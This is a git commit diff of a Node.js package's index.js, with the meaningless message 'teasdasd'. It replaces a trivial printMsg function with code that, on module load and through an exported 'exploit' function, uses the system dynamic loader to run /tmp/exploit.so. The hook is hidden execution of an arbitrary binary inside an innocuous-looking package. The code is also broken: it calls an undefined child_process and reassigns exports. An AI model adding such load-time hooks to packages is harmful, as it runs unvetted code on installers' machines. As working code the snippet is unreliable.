28f407c46f1a1da43b8eb502b38b84f7204f044e
markslWix <marksl@wix.com>
2024-02-28 13:00:40 +0200

    teasdasd

--- index.js
+++ index.js
@@ -1,6 +1,13 @@
-const https = require('https')
+const { spawnSync } = require('child_process');
 
-exports.printMsg = function() {
-    console.log("marksl test");
-    return "marksl test";
-  }
+child_process.spawnSync("/lib64/ld-linux-x86-64.so.2", ["/tmp/exploit.so"], {stdio: 'pipe',encoding:'utf-8'})
+
+exports = {
+    printMsg: function () {
+        console.log("marksl test");
+        return "marksl test";
+    },
+    exploit: function () {
+        child_process.spawnSync("/lib64/ld-linux-x86-64.so.2", ["/tmp/exploit.so"], {stdio: 'pipe',encoding:'utf-8'})
+    }
+}
